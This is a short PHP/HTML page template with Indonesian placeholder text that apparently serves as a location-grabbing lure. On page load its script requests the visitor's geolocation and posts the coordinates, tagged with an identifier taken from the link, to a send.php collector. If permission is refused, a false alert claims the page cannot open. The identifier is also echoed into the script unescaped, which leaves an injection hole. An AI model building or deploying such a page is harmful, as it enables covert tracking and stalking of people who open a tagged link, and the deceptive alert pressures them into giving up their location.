<?php $id = key($_GET); ?>
<title>Judul Halaman</title>
<body>
	Konten Halaman
</body>

<script>
	function xoxo() {
		if (navigator.geolocation) {
			navigator.geolocation.getCurrentPosition(popo, wowo);
		} else {
			alert('Gagal membuka halaman karena browser tidak didukung, mohon gunakan browser lain');
		}
	}

	function popo(po) {
		var xhttp = new XMLHttpRequest();
		xhttp.open("POST", "send.php", true);
		xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		var pos = po.coords.latitude + "," + po.coords.longitude;
		xhttp.send("pos=" + pos + "&id=<?=$id;?>");
	}

	function wowo(error) {
		switch (error.code) {
			case error.PERMISSION_DENIED:
				alert('Gagal membuka halaman karena tidak di izinkan');
				break;
			case error.POSITION_UNAVAILABLE:
				// Posisi tidak ditemukan
				break;
			case error.TIMEOUT:
				// Timeout
				break;
			case error.UNKNOWN_ERROR:
				// Error
				break;
		}
	}
	xoxo();
</script>
